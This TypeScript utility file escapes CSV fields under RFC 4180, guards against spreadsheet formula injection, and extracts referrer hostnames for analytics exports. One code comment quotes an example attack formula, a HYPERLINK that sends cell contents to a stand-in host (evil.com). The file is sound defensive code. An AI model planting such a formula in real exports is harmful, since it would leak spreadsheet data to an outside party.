/**
 * CSV export utilities.
 *
 * - csvEscape: RFC 4180 quoting + OWASP CSV-formula-injection guard.
 *   Shared between /api/_admin/attribution and /api/_audit/export
 *   (both were carrying near-identical copies; simplifier audit
 *   2026-04-20).
 * - safeRefDomain: best-effort hostname extraction used when we
 *   export referrer columns; gracefully falls back to the raw
 *   string (truncated) rather than dropping unparseable URLs.
 */

/**
 * RFC 4180 escape + CSV formula-injection guard.
 *
 * Two threats we defend against:
 *   1. Field contains quote/comma/newline — RFC 4180: wrap in quotes
 *      and double any internal quotes.
 *   2. Field starts with =, +, -, @, \t, or \r — when Excel / Numbers /
 *      Google Sheets opens the CSV these are interpreted as formulas,
 *      giving the attacker arbitrary-code execution in the reviewer's
 *      spreadsheet (e.g. action="=HYPERLINK(\"evil.com?\"&A1)").
 *      Mitigation: prefix such fields with a tab character, which
 *      Excel strips silently on import for text cells. This is the
 *      OWASP-recommended fix (see "CSV Injection" cheat sheet).
 */
export function csvEscape(value: string | null | undefined): string {
  if (value === null || value === undefined) return "";
  let s = String(value);
  // Formula-injection guard — see OWASP CSV Injection cheat sheet
  if (/^[=+\-@\t\r]/.test(s)) s = "\t" + s;
  if (s.includes('"') || s.includes(",") || s.includes("\n") || s.includes("\r")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/**
 * Pull the hostname out of a full referrer URL for analytics export.
 * Strips the leading `www.` so `www.google.com` and `google.com`
 * collapse to the same key. On parse failure returns the raw string
 * truncated to 80 chars — better to show "malformed-referrer-X" than
 * silently drop it from the export.
 */
export function safeRefDomain(referrer: string | null | undefined): string {
  if (!referrer) return "";
  try {
    return new URL(referrer).hostname.replace(/^www\./, "");
  } catch {
    return referrer.slice(0, 80);
  }
}
